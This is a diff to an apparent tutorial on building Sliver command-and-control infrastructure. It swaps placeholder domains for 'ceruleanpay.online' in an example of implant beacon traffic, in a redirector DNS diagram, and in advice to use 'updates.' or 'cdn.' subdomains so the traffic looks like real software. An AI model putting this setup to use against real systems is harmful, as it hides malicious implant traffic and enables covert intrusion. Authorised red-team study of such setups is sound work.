@@ -211,7 +211,7 @@ When the implant makes an HTTPS request to your domain:
 ```
 Implant sends:
 POST /update HTTP/1.1
-Host: updates.yourdomain.com
+Host: updates.ceruleanpay.online
 User-Agent: [whatever profile you use]
 Content-Type: application/octet-stream
 [encrypted C2 traffic as request body]
@@ -390,11 +390,11 @@ YOUR OPERATOR MACHINE (any OS, your workstation)
                                    DNS record points
                                    to this VM's IP
                                         |
-                                +-------+--------+
-                                |  Hostinger DNS  |
-                                |  updates.domain.|
-                                |  A record       |
-                                +-----------------+
+                                +-------+--------------------+
+                                |  Hostinger DNS             |
+                                |  updates.ceruleanpay.online|
+                                |  A record                  |
+                                +----------------------------+
 ```
 
 Let me walk you through every arrow in that diagram.
@@ -436,7 +436,7 @@ Do not use a powerful VM for no reason. Unnecessary compute means unnecessary co
 
 We control the domain through Hostinger's hPanel. We will add a subdomain DNS record (an A record) pointing to the redirector VM's public IP. When the implant connects to our subdomain, Hostinger's DNS resolves it to the redirector.
 
-We use a subdomain (like `cdn.ourdomain.com` or `updates.ourdomain.com`) rather than the root domain because it looks more like a specific service endpoint, which is what real software uses for CDN and update servers.
+We use a subdomain (like `cdn.ceruleanpay.online` or `updates.ceruleanpay.online`) rather than the root domain because it looks more like a specific service endpoint, which is what real software uses for CDN and update servers.
 
 ### Sliver C2
 
